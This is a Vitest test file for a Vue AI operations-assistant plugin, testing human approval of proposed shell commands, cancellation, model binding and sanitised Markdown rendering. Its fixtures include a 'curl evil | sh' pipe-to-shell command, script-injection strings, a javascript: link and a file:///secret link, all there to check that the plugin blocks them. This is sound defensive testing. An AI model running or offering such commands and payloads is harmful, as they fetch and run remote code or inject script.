/* eslint-disable vue/one-component-per-file -- Each test mounts an isolated component. */
import { afterEach, beforeEach, expect, it, vi } from 'vitest';
import { createApp, nextTick, ref, type App } from 'vue';
import { createPinia, setActivePinia, type Pinia, disposePinia } from 'pinia';
const api = vi.hoisted(() => ({
  models: vi.fn(),
  localCodexStatus: vi.fn(),
  localCodexAuthorize: vi.fn(),
  localClaudeCodeStatus: vi.fn(),
  localClaudeCodeAuthorize: vi.fn(),
  localToolInstall: vi.fn(),
  localToolInstallCancel: vi.fn(),
  settings: vi.fn(),
  prepare: vi.fn(),
  send: vi.fn(),
  execute: vi.fn(),
  cancel: vi.fn(),
  resolveHosts: vi.fn(),
  hostList: vi.fn(),
  opsOpen: vi.fn(),
  opsClose: vi.fn(),
  trust: vi.fn(),
  begin: vi.fn(),
  end: vi.fn(),
}));
vi.mock('./api', () => ({ useAssistantApi: () => api }));
vi.mock('@serverdeck/plugin-sdk/platform', () => ({
  call: async (operation: { kind: string }) => {
    if (operation.kind === 'models')
      return {
        models: await api.models(),
        sources: [
          { id: 'local-codex', name: '本地 Codex', status: await api.localCodexStatus() },
          {
            id: 'local-claude-code',
            name: '本地 Claude Code',
            status: await api.localClaudeCodeStatus(),
          },
        ],
      };
    if (operation.kind === 'hosts') return api.hostList();
    return api.settings(operation);
  },
}));
vi.mock('@serverdeck/plugin-sdk/connections', () => ({ ensureConnection: api.opsOpen }));
vi.mock('@serverdeck/plugin-sdk/actions', () => ({ cancelCurrent: api.cancel }));
const navigation = vi.hoisted(() => vi.fn());
vi.mock('@serverdeck/plugin-sdk/transport', () => ({ request: navigation }));
import AssistantView from './AssistantView.vue';
import SettingsView from './SettingsView.vue';
import { useAssistant } from './assistant';
import { usePlatformContext, updatePlatformContext } from '@serverdeck/plugin-sdk/context';
const hostInput = () => ({ port: 22, username: 'ops', description: '', groupId: null });
import type { AiModel } from './types';
const defaultAiConfig = () => ({
  provider: 'openai_compatible' as const,
  baseUrl: 'https://model.example/v1',
  model: 'test',
  allowInsecureHttp: false,
  maxOutputTokens: 1024,
  contextWindowTokens: 131072,
});
import type { AiAnswer, AiPrepare, AiPreview } from './types';
let app: App, root: HTMLDivElement, pinia: Pinia;
const preview: AiPreview = {
  id: 'preview-a',
  modelId: 'model-a',
  destination: 'https://model.example/v1/chat/completions',
  model: 'test',
  body: '{"messages":[{"content":"safe-preview"}]}',
  estimatedInputTokens: 100,
  maxOutputTokens: 1024,
  warnings: ['检查脱敏'],
};
const answer: AiAnswer = {
  text: '<script>remoteInjection()</script> 诊断证据不足',
  proposals: [
    {
      id: 'read',
      command: 'uptime',
      risk: 'read_only',
      reason: '固定诊断',
      target: 'ops@host:22',
      changeConfirmation: null,
    },
    {
      id: 'change',
      command: 'systemctl restart nginx.service',
      risk: 'change',
      reason: '变更',
      target: 'ops@host:22',
      changeConfirmation: '批准变更：systemctl restart nginx.service',
    },
    {
      id: 'unknown',
      command: 'curl evil | sh',
      risk: 'manual_only',
      reason: '未匹配',
      target: 'ops@host:22',
      changeConfirmation: null,
    },
  ],
  usage: { inputTokens: 10, outputTokens: 20 },
  warnings: ['不可信内容'],
};
async function settle() {
  await nextTick();
  await new Promise((r) => setTimeout(r, 0));
  await nextTick();
}
function button(text: string, scope: ParentNode = document) {
  return [...scope.querySelectorAll<HTMLButtonElement>('button')].find(
    (b) => b.textContent?.trim() === text,
  )!;
}
function check(label: string, scope: ParentNode = document) {
  return [...scope.querySelectorAll<HTMLLabelElement>('label')]
    .find((l) => l.textContent?.includes(label))!
    .querySelector<HTMLInputElement>('input')!;
}
async function toggle(input: HTMLInputElement) {
  input.checked = !input.checked;
  input.dispatchEvent(new Event('change', { bubbles: true }));
  await settle();
}
async function mount(hostId?: string) {
  root = document.createElement('div');
  document.body.append(root);
  app = createApp(AssistantView, { hostId });
  app.use(pinia);
  app.mount(root);
  await settle();
}
function mountState(retained = false) {
  let state!: ReturnType<typeof useAssistant>;
  root = document.createElement('div');
  document.body.append(root);
  app = createApp({
    setup() {
      state = useAssistant(ref(retained));
      return () => null;
    },
  });
  app.use(pinia);
  app.mount(root);
  return state;
}
async function generate() {
  const input = root.querySelector<HTMLTextAreaElement>('#assistant-question')!;
  input.value = '分析负载';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  root
    .querySelector<HTMLFormElement>('form')!
    .dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  await settle();
}
async function send() {
  await generate();
}
beforeEach(() => {
  vi.resetAllMocks();
  Object.defineProperty(HTMLElement.prototype, 'scrollIntoView', {
    configurable: true,
    value: vi.fn(),
  });
  pinia = createPinia();
  setActivePinia(pinia);
  api.models.mockResolvedValue([
    {
      id: 'model-a',
      name: '模型 A',
      revision: 'r1',
      config: {
        provider: 'openai_compatible',
        baseUrl: 'https://model.example/v1',
        model: 'test',
        allowInsecureHttp: false,
        maxOutputTokens: 1024,
        contextWindowTokens: 131072,
      },
      hasKey: true,
    },
  ]);
  api.settings.mockResolvedValue({ modelId: 'model-a' });
  api.localCodexStatus.mockResolvedValue({
    authorized: false,
    model: null,
    message: '请先授权使用本地 Codex',
  });
  api.localCodexAuthorize.mockResolvedValue(undefined);
  api.localClaudeCodeStatus.mockResolvedValue({
    authorized: false,
    model: null,
    message: '请先授权使用本地 Claude Code',
  });
  api.localClaudeCodeAuthorize.mockResolvedValue(undefined);
  api.prepare.mockResolvedValue(preview);
  api.resolveHosts.mockResolvedValue({ hostIds: [], message: '', modelRevision: 'r1' });
  api.hostList.mockResolvedValue({
    hosts: [],
    groups: [],
    credentials: [],
    pendingSecretDeletions: 0,
  });
  api.opsClose.mockResolvedValue(undefined);
  api.trust.mockResolvedValue(undefined);
  api.send.mockResolvedValue(answer);
  api.cancel.mockResolvedValue(undefined);
  api.execute.mockResolvedValue({ success: true, output: 'readonly-output' });
  Object.defineProperty(HTMLDialogElement.prototype, 'showModal', {
    configurable: true,
    value: function (this: HTMLDialogElement) {
      this.open = true;
    },
  });
});
afterEach(() => {
  app?.unmount();
  root?.remove();
  disposePinia(pinia);
});
it('delegates context selection to the host without a configuration panel or send dialog', async () => {
  await mount();
  expect(root.querySelector('aside, [aria-controls="assistant-context"]')).toBeNull();
  expect(root.querySelector('input[type=checkbox]')).toBeNull();
  expect(root.querySelector('.ai-model-bar, select')).toBeNull();
  await generate();
  expect(api.prepare).toHaveBeenCalledWith(
    expect.objectContaining({
      autoHosts: true,
      maskAddresses: true,
      redactValues: [],
      selection: {
        server: true,
        metrics: false,
        processes: false,
        docker: false,
        log: null,
        logLines: 100,
      },
    }),
  );
  expect(api.send).toHaveBeenCalledOnce();
  expect(api.send).toHaveBeenCalledWith('preview-a', true);
  expect(document.querySelector('dialog')).toBeNull();
  expect(api.execute).not.toHaveBeenCalled();
});
it('shows preparation omissions alongside response warnings without duplicates', async () => {
  api.prepare.mockResolvedValue({ ...preview, warnings: ['已汇总容器，省略明细', '不可信内容'] });
  await mount();
  await generate();
  const notes = root.querySelector('.ai-chat-notes')!;
  expect(notes.textContent).toContain('上下文与响应提示');
  expect(notes.textContent).toContain('已汇总容器，省略明细');
  expect(notes.textContent!.split('不可信内容')).toHaveLength(2);
});
it('retains a conversation when the SDK refreshes unchanged model metadata and clears it for a new revision', async () => {
  await mount();
  await send();
  const copy = (await api.models()) as AiModel[];
  updatePlatformContext({ ...JSON.parse(JSON.stringify(usePlatformContext())), models: copy });
  await settle();
  expect(root.textContent).toContain('分析负载');
  expect(root.textContent).toContain('诊断证据不足');
  expect(api.cancel).not.toHaveBeenCalled();
  const changed = copy.map((model) => ({ ...model, revision: 'changed' }));
  api.models.mockResolvedValue(changed);
  updatePlatformContext({ ...JSON.parse(JSON.stringify(usePlatformContext())), models: changed });
  await settle();
  expect(root.textContent).not.toContain('诊断证据不足');
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
});
it('approves one immutable read-only proposal once and requires a separate typed change confirmation', async () => {
  await mount();
  await send();
  const reviewButtons = () => root.querySelectorAll<HTMLButtonElement>('.ai-proposal button');
  reviewButtons()[0]!.click();
  await settle();
  expect(button('批准执行这一条').disabled).toBe(true);
  expect(api.execute).not.toHaveBeenCalled();
  await toggle(check('我已审核目标'));
  button('批准执行这一条').click();
  await settle();
  expect(api.execute).toHaveBeenCalledWith('read', true, null);
  expect(reviewButtons()[0]!.disabled).toBe(true);
  expect(root.textContent).toContain('readonly-output');
  reviewButtons()[1]!.click();
  await settle();
  await toggle(check('我已审核目标'));
  expect(button('批准执行这一条').disabled).toBe(true);
  const input = document.querySelector<HTMLInputElement>('dialog input:not([type=checkbox])')!;
  input.value = 'yes';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  expect(button('批准执行这一条').disabled).toBe(true);
  input.value = answer.proposals[1]!.changeConfirmation!;
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  button('批准执行这一条').click();
  await settle();
  expect(api.execute).toHaveBeenLastCalledWith('change', true, input.value);
  expect(api.execute).toHaveBeenCalledTimes(2);
});
it('keeps conversation when editing a draft, carries prior messages and recovers from API failure', async () => {
  await mount();
  await send();
  const input = root.querySelector<HTMLTextAreaElement>('#assistant-question')!;
  input.value = '继续排查';
  input.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(1);
  expect(api.cancel).not.toHaveBeenCalled();
  api.send.mockRejectedValueOnce({ message: '模型服务暂不可用' });
  root
    .querySelector('form')!
    .dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
  await settle();
  expect(api.prepare.mock.lastCall![0].history).toEqual([
    { role: 'user', content: '分析负载' },
    { role: 'assistant', content: answer.text },
  ]);
  expect(root.textContent).toContain('模型服务暂不可用');
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(2);
  expect(api.execute).not.toHaveBeenCalled();
  await send();
  expect(root.querySelectorAll('.ai-markdown')).toHaveLength(2);
});
it('loads the persisted plugin binding and revokes old previews on rebind, edit and deletion', async () => {
  await mount();
  await generate();
  expect(root.querySelector('input[type=password]')).toBeNull();
  const store = { models: (await api.models()) as AiModel[] };
  const b: AiModel = {
    id: 'model-b',
    name: '模型 B',
    revision: 'r1',
    config: { ...defaultAiConfig(), model: 'other' },
    hasKey: true,
  };
  store.models.push(b);
  await settle();
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  api.models.mockResolvedValue([...store.models]);
  api.settings.mockResolvedValue({ modelId: 'model-b' });
  updateVisibility(false);
  await settle();
  updateVisibility(true);
  await settle();
  expect(root.querySelector('select')).toBeNull();
  expect(root.querySelectorAll('.ai-chat-turn, .ai-proposal')).toHaveLength(0);
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
  await generate();
  expect(api.prepare.mock.lastCall![0].modelId).toBe('model-b');
  store.models = store.models.map((m) => (m.id === 'model-b' ? { ...m, revision: 'edited' } : m));
  api.models.mockResolvedValue(store.models);
  updatePlatformContext({
    ...JSON.parse(JSON.stringify(usePlatformContext())),
    models: store.models,
  });
  await settle();
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
  await generate();
  store.models = store.models.filter((m) => m.id !== 'model-b');
  api.models.mockResolvedValue(store.models);
  updatePlatformContext({
    ...JSON.parse(JSON.stringify(usePlatformContext())),
    models: store.models,
  });
  await settle();
  expect(button('发送').disabled).toBe(true);
  expect(root.querySelector('[aria-label="发送预览"]')).toBeNull();
});
it('revokes a late preview after the view has been disposed', async () => {
  let resolve!: (v: AiPreview) => void;
  api.prepare.mockReturnValue(
    new Promise<AiPreview>((r) => {
      resolve = r;
    }),
  );
  const state = mountState();
  const input: AiPrepare = {
    modelId: 'model-a',
    sessionId: null,
    question: 'test',
    selection: {
      server: false,
      metrics: false,
      processes: false,
      docker: false,
      log: null,
      logLines: 100,
    },
    maskAddresses: true,
    redactValues: [],
  };
  const task = state.send(input);
  app.unmount();
  resolve(preview);
  await task;
  expect(state.turns.value).toHaveLength(0);
  expect(api.send).not.toHaveBeenCalled();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  expect(api.send).not.toHaveBeenCalled();
});

const fixtureHost = (id: string) => ({
  ...hostInput(),
  id,
  name: `主机 ${id}`,
  hostname: `${id}.example`,
  username: 'ops',
  createdAt: '',
  updatedAt: '',
});
function catalog(hosts: ReturnType<typeof fixtureHost>[]) {
  return { hosts, groups: [], credentials: [], pendingSecretDeletions: 0 };
}
function openConnected() {
  api.opsOpen.mockResolvedValue({ state: 'connected' });
}
it('matches all assets automatically and only connects the matched host', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  openConnected();
  await mount();
  expect(root.querySelectorAll('select')).toHaveLength(0);
  expect(api.opsOpen).not.toHaveBeenCalled();

  await send();
  expect(api.opsOpen).toHaveBeenCalledOnce();
  expect(api.opsOpen.mock.calls[0]![0]).toBe('a');

  expect(api.prepare).toHaveBeenCalledWith(
    expect.objectContaining({
      sessionId: null,
      sessionIds: ['a'],
      autoHosts: true,
      expectedModelRevision: 'r1',
    }),
  );
  expect(api.send).toHaveBeenCalledOnce();
  expect(root.textContent).toContain('命中：主机 a');
});
it('returns the matched host connection failure without calling the diagnosis model or another host', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockRejectedValue({ message: 'SSH 认证失败' });
  await mount();
  await send();
  expect(root.textContent).toContain('主机 a：SSH 认证失败');
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.send).not.toHaveBeenCalled();
  expect(api.opsOpen).toHaveBeenCalledOnce();
});
it('waits for the trusted platform connection and never prepares after cancellation', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  let finish!: () => void;
  api.opsOpen.mockImplementation(() => new Promise<void>((resolve) => (finish = resolve)));
  await mount();
  await generate();
  expect(root.textContent).toContain('正在连接 主机 a');
  button('停止').click();
  await settle();
  finish();
  await settle();
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.send).not.toHaveBeenCalled();
  expect(root.textContent).toContain('已停止回答');
});
it('connects multiple matched targets before one combined diagnostic request', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a', 'b'], message: '', modelRevision: 'r1' });
  openConnected();
  await mount();
  await send();
  expect(api.opsOpen).toHaveBeenCalledTimes(2);
  expect(api.prepare.mock.lastCall![0].sessionIds).toEqual(['a', 'b']);
  expect(api.send).toHaveBeenCalledOnce();
});
it('shows a frozen agent plan, submits it for trusted host approval and presents per-target verification', async () => {
  const agentAnswer: AiAnswer = {
    ...answer,
    proposals: [
      {
        ...answer.proposals[1]!,
        id: 'plan-a',
        command: '执行计划：2 个操作',
        changeConfirmation: '执行计划 12345678',
      },
    ],
    agent: {
      observations: [{ query: 'Docker 镜像', success: true, records: 3, message: null }],
      steps: [
        { action: '删除无标签镜像', target: 'sha256:image-a' },
        { action: '删除无标签镜像', target: 'sha256:image-b' },
      ],
    },
  };
  api.send.mockResolvedValueOnce(agentAnswer);
  api.execute.mockResolvedValueOnce({
    success: false,
    output: '计划未全部完成',
    agent: {
      steps: [
        { ...agentAnswer.agent!.steps[0], status: 'verified', message: '已复查镜像不存在' },
        { ...agentAnswer.agent!.steps[1], status: 'failed', message: '镜像被引用，未强制删除' },
      ],
    },
  });
  await mount();
  await send();
  expect(root.textContent).toContain('已查询 1 项主机信息');
  expect(root.textContent).toContain('执行计划 · 2 项操作');
  expect(root.textContent).toContain('sha256:image-a');
  expect(api.execute).not.toHaveBeenCalled();
  button('审核执行计划').click();
  await settle();
  expect(api.execute).not.toHaveBeenCalled();
  await toggle(check('我已审核目标'));
  const confirmation = document.querySelector<HTMLInputElement>(
    'dialog input:not([type=checkbox])',
  )!;
  confirmation.value = '执行计划 12345678';
  confirmation.dispatchEvent(new Event('input', { bubbles: true }));
  await settle();
  button('批准执行这一条').click();
  await settle();
  expect(document.querySelector('.ai-command-review')).toBeNull();
  expect(api.execute).toHaveBeenCalledExactlyOnceWith('plan-a', true, '执行计划 12345678');
  expect(root.textContent).toContain('已复查镜像不存在');
  expect(root.textContent).toContain('镜像被引用，未强制删除');
  expect(root.textContent).not.toContain('计划已执行并完成复查');
});
it('can stop remaining plan steps while retaining the final execution report', async () => {
  let finish!: (result: { success: boolean; output: string }) => void;
  const state = mountState();
  await state.send({
    modelId: 'model-a',
    sessionId: null,
    question: 'cleanup',
    selection: {
      server: false,
      metrics: false,
      processes: false,
      docker: false,
      log: null,
      logLines: 20,
    },
    maskAddresses: true,
    redactValues: [],
  });
  state.inspect(answer.proposals[0]!);
  api.execute.mockReturnValueOnce(
    new Promise((resolve) => {
      finish = resolve;
    }),
  );
  const work = state.execute(true, '');
  await settle();
  await state.cancel();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  finish({ success: false, output: '已停止；已提交的操作结果未确认' });
  await work;
  expect(state.outputs.value.read?.output).toContain('结果未确认');
});
it('shows progress and cancels analysis without another submit or a late answer', async () => {
  let resolve!: (value: AiAnswer) => void;
  api.send.mockReturnValueOnce(
    new Promise<AiAnswer>((r) => {
      resolve = r;
    }),
  );
  await mount();
  await generate();
  expect(root.querySelector('[role="status"]')?.textContent).toContain('正在思考');
  expect(root.querySelector<HTMLTextAreaElement>('#assistant-question')!.disabled).toBe(true);
  button('停止').click();
  await settle();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  expect(api.prepare).toHaveBeenCalledOnce();
  resolve(answer);
  await settle();
  expect(root.querySelector('.ai-markdown')).toBeNull();
  expect(root.textContent).toContain('已停止回答');
  expect(api.execute).not.toHaveBeenCalled();
});
it('renders Markdown structure but blocks HTML, executable URLs and remote images', async () => {
  api.send.mockResolvedValueOnce({
    ...answer,
    text: '## 结论\n\n**检查负载**\n\n- 查看进程\n- 核对日志\n\n|项目|值|\n|---|---|\n|负载|未知|\n\n```sh\nuptime\n```\n\n<script>attack()</script>\n\n![tracking](https://track.example/pixel)\n\n[x](javascript:attack()) [local](file:///secret) [ok](https://example.com/docs)',
    proposals: [],
  });
  await mount();
  await send();
  expect(root.querySelector('.ai-markdown h3')?.textContent).toBe('结论');
  expect(root.querySelector('.ai-markdown strong')?.textContent).toBe('检查负载');
  expect(root.querySelectorAll('.ai-markdown li')).toHaveLength(2);
  expect(root.querySelectorAll('.ai-markdown table td')).toHaveLength(2);
  expect(root.querySelector('.ai-markdown pre code')?.textContent).toBe('uptime');
  expect(root.querySelector('script,img,iframe')).toBeNull();
  expect([...root.querySelectorAll('a')].map((a) => a.getAttribute('href'))).toEqual([
    'https://example.com/docs',
  ]);
  expect(root.textContent).toContain('<script>attack()</script>');
});
it('starts a new conversation and never includes execution output in follow-up history', async () => {
  await mount();
  await send();
  button('审核此命令').click();
  await settle();
  await toggle(check('我已审核目标'));
  button('批准执行这一条').click();
  await settle();
  await send();
  const history = api.prepare.mock.lastCall![0].history;
  expect(JSON.stringify(history)).not.toContain('readonly-output');
  expect(JSON.stringify(history)).not.toContain('changeConfirmation');
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(2);
  button('新对话').click();
  await settle();
  expect(root.querySelectorAll('.ai-chat-turn')).toHaveLength(0);
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  await send();
  expect(api.prepare.mock.lastCall![0].history).toEqual([]);
});

it('bounds retained turns and sent history, and revokes commands for discarded turns', async () => {
  const state = mountState();
  let sequence = 0;
  api.prepare.mockImplementation(async () => ({ ...preview, id: `turn-${++sequence}` }));
  api.send.mockResolvedValue({ ...answer, text: '汉🙂'.repeat(5000), proposals: [] });
  for (let i = 0; i < 22; i++)
    await state.send({
      modelId: 'model-a',
      sessionId: null,
      question: `question-${i}`,
      selection: {
        server: false,
        metrics: false,
        processes: false,
        docker: false,
        log: null,
        logLines: 100,
      },
      maskAddresses: true,
      redactValues: [],
    });
  expect(state.turns.value).toHaveLength(20);
  expect(api.cancel).toHaveBeenCalledWith('turn-1');
  expect(api.cancel).toHaveBeenCalledWith('turn-2');
  const history = api.prepare.mock.lastCall![0].history;
  expect(history.length).toBeGreaterThan(0);
  expect(history.length).toBeLessThanOrEqual(12);
  expect(
    history.reduce(
      (n: number, m: { content: string }) => n + new TextEncoder().encode(m.content).length,
      0,
    ),
  ).toBeLessThanOrEqual(48 * 1024);
  expect(history[1].content).toContain('历史回答过长');
});

it('preserves platform connection diagnostics and cancellation cleanup failures', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['a'], message: '', modelRevision: 'r1' });
  api.opsOpen.mockRejectedValue({ message: '异步认证被服务器拒绝' });
  await mount();
  await send();
  expect(root.textContent).toContain('异步认证被服务器拒绝');
  expect(api.prepare).not.toHaveBeenCalled();
});
it('uses the entry host as a matching hint while allowing other registered hosts by default', async () => {
  api.hostList.mockResolvedValue(catalog([fixtureHost('a'), fixtureHost('b')]));
  api.resolveHosts.mockResolvedValue({ hostIds: ['b'], message: '', modelRevision: 'r1' });
  openConnected();
  await mount('a');
  await send();
  expect(api.resolveHosts).toHaveBeenCalledWith(
    expect.objectContaining({ previousHostIds: ['a'] }),
  );
  expect(api.prepare).toHaveBeenCalledWith(
    expect.objectContaining({ sessionIds: ['b'], autoHosts: true }),
  );
  expect(api.opsOpen.mock.calls[0]![0]).toBe('b');
  await send();
  expect(api.resolveHosts).toHaveBeenLastCalledWith(
    expect.objectContaining({ previousHostIds: ['b'] }),
  );
});

it('quick questions only fill the draft without sending or exposing context controls', async () => {
  await mount();
  root.querySelector<HTMLButtonElement>('[aria-label="容器排查"]')!.click();
  await settle();
  expect(root.querySelector<HTMLTextAreaElement>('#assistant-question')!.value).toContain('Docker');
  expect(api.prepare).not.toHaveBeenCalled();
  expect(api.resolveHosts).not.toHaveBeenCalled();
  expect(root.querySelector('aside, [aria-controls="assistant-context"]')).toBeNull();
});
it('retains readable replies after hiding but expires old command handles without cancelling them in a new host context', async () => {
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  const state = mountState();
  state.turns.value = [
    {
      id: 'turn',
      question: 'question',
      state: 'complete',
      answer,
      requestId: 'old-context-preview',
      error: '',
      hostIds: [],
    },
  ];
  updateVisibility(false);
  await settle();
  updateVisibility(true);
  await settle();
  expect(state.turns.value[0]!.answer?.text).toBe(answer.text);
  state.inspect(answer.proposals[0]!);
  expect(state.review.value).toBeNull();
  state.invalidate();
  await settle();
  expect(api.cancel).not.toHaveBeenCalledWith('old-context-preview');
  expect(state.error.value).toBe('');
});
it('finishes a retained host answer while hidden and keeps its plan usable after returning', async () => {
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  updateVisibility(true);
  let finish!: (value: AiAnswer) => void;
  api.send.mockReturnValueOnce(
    new Promise<AiAnswer>((resolve) => {
      finish = resolve;
    }),
  );
  const state = mountState(true);
  const work = state.send({
    modelId: 'model-a',
    sessionId: null,
    question: 'test',
    selection: {
      server: false,
      metrics: false,
      processes: false,
      docker: false,
      log: null,
      logLines: 20,
    },
    maskAddresses: true,
    redactValues: [],
  });
  await settle();
  expect(api.begin).toHaveBeenCalledOnce();
  updateVisibility(false);
  await settle();
  expect(state.turns.value[0]?.state).toBe('pending');
  expect(api.cancel).not.toHaveBeenCalled();
  finish(answer);
  await work;
  expect(state.turns.value[0]?.state).toBe('complete');
  expect(state.expired.value).toEqual([]);
  expect(api.end).toHaveBeenCalledOnce();
  updateVisibility(true);
  await settle();
  state.inspect(answer.proposals[0]!);
  expect(state.review.value?.id).toBe('read');
  let executed!: (value: { success: boolean; output: string }) => void;
  api.execute.mockReturnValueOnce(
    new Promise((resolve) => {
      executed = resolve;
    }),
  );
  const execution = state.execute(true, '');
  await settle();
  updateVisibility(false);
  await settle();
  expect(state.busy.value).toBe('execute');
  expect(api.cancel).not.toHaveBeenCalled();
  executed({ success: true, output: 'verified while hidden' });
  await execution;
  expect(state.outputs.value.read).toEqual({ success: true, output: 'verified while hidden' });
  expect(api.begin).toHaveBeenCalledTimes(2);
  expect(api.end).toHaveBeenCalledTimes(2);
  updateVisibility(true);
});
it('continues from a late prepare response while hidden but revokes it when the host view is disposed', async () => {
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  updateVisibility(true);
  let prepared!: (value: AiPreview) => void;
  api.prepare.mockReturnValueOnce(
    new Promise<AiPreview>((resolve) => {
      prepared = resolve;
    }),
  );
  const state = mountState(true);
  const work = state.send({
    modelId: 'model-a',
    sessionId: null,
    question: 'test',
    selection: {
      server: false,
      metrics: false,
      processes: false,
      docker: false,
      log: null,
      logLines: 20,
    },
    maskAddresses: true,
    redactValues: [],
  });
  await settle();
  updateVisibility(false);
  await settle();
  prepared(preview);
  await work;
  expect(api.send).toHaveBeenCalledOnce();
  expect(state.turns.value[0]?.state).toBe('complete');
  app.unmount();
  await settle();
  expect(api.cancel).toHaveBeenCalledWith('preview-a');
  updateVisibility(true);
});

it('blocks unbound, deleted and unreadable model bindings without silently choosing another model', async () => {
  api.settings.mockResolvedValue({});
  await mount();
  expect(root.textContent).toContain('请先在插件设置中绑定模型');
  await generate();
  expect(button('发送').disabled).toBe(true);
  expect(api.prepare).not.toHaveBeenCalled();
  const { updateVisibility } = await import('@serverdeck/plugin-sdk/visibility');
  updateVisibility(false);
  await settle();
  api.settings.mockResolvedValue({ modelId: 'removed-model' });
  updateVisibility(true);
  await settle();
  expect(root.textContent).toContain('绑定模型已删除');
  expect(button('发送').disabled).toBe(true);
  updateVisibility(false);
  await settle();
  api.settings.mockRejectedValue({ message: '插件配置读取失败' });
  updateVisibility(true);
  await settle();
  expect(root.textContent).toContain('插件配置读取失败');
  expect(button('发送').disabled).toBe(true);
  expect(api.send).not.toHaveBeenCalled();
});

async function mountSettings() {
  root = document.createElement('div');
  document.body.append(root);
  app = createApp(SettingsView);
  app.use(pinia);
  app.mount(root);
  await settle();
}

function chooseModel(id: string) {
  const field = root.querySelector<HTMLSelectElement>('select')!;
  field.value = id;
  field.dispatchEvent(new Event('change', { bubbles: true }));
}
it('shows model identity and disables models without credentials, without changing saved settings', async () => {
  const original = (await api.models())[0] as AiModel;
  api.models.mockResolvedValue([
    original,
    {
      ...original,
      id: 'missing',
      name: '备用模型',
      config: { ...original.config, model: 'backup-model' },
      hasKey: false,
    },
  ]);
  await mountSettings();
  expect(root.textContent).toContain('backup-model');
  expect(root.querySelector<HTMLOptionElement>('option[value="missing"]')!.disabled).toBe(true);
  expect(root.querySelector<HTMLSelectElement>('select')!.value).toBe('model-a');
  chooseModel('');
  await settle();
  expect(api.settings.mock.calls.some(([op]) => op.kind === 'settings_write')).toBe(false);
});
it('persists a plugin binding across remounts while preserving other settings', async () => {
  let value: Record<string, unknown> = { otherSetting: 'keep' };
  api.settings.mockImplementation(async (op: { kind: string; value?: Record<string, unknown> }) => {
    if (op.kind === 'settings_write') {
      value = op.value!;
      return null;
    }
    return value;
  });
  await mountSettings();
  chooseModel('model-a');
  await settle();
  button('保存绑定').click();
  await settle();
  expect(value).toEqual({ otherSetting: 'keep', modelId: 'model-a' });
  expect(root.textContent).toContain('模型绑定已保存');
  app.unmount();
  root.remove();
  await mount();
  await send();
  expect(api.prepare.mock.lastCall![0].modelId).toBe('model-a');
});
it('preserves the previous model binding when saving fails and allows retry', async () => {
  await mountSettings();
  chooseModel('');
  await settle();
  api.settings.mockRejectedValueOnce({ message: '无法保存插件设置' });
  button('保存绑定').click();
  await settle();
  expect(root.textContent).toContain('无法保存插件设置');
  expect(root.textContent).not.toContain('已解除模型绑定');
  expect(button('保存绑定').disabled).toBe(false);
  api.settings.mockResolvedValueOnce(null);
  button('保存绑定').click();
  await settle();
  expect(root.textContent).toContain('已解除模型绑定');
});
it('navigates to platform-owned CLI settings without private installation or authorization APIs', async () => {
  await mountSettings();
  button('打开平台模型设置').click();
  await settle();
  expect(navigation).toHaveBeenCalledWith('workspace.navigate', { view: 'models' });
  expect(api.localToolInstall).not.toHaveBeenCalled();
  expect(api.localCodexAuthorize).not.toHaveBeenCalled();
  expect(api.localClaudeCodeAuthorize).not.toHaveBeenCalled();
});
it.each(['local-codex', 'local-claude-code'])(
  'uses an authorized local model from the same generic catalog: %s',
  async (id) => {
    const model = { ...(await api.models())[0], id, name: id };
    api.models.mockResolvedValue([model]);
    api.settings.mockResolvedValue({ modelId: id });
    await mount();
    await send();
    expect(api.prepare.mock.lastCall![0].modelId).toBe(id);
  },
);
